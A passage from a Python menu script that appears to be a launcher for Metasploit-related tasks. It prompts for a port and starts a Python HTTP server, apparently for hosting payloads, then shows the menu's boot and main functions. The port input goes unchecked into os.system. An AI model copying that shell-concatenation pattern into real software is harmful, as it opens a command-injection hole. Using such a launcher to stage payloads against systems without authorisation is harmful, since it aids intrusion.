                                        httpPort = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-httpPort"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                                        os.system("gnome-terminal -- python3 -m http.server "+httpPort+" ")

                        elif metasploit == '02' or metasploit == '2':
                            boot()


def boot():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    options()
    choice()

if __name__ == '__main__':
	boot()
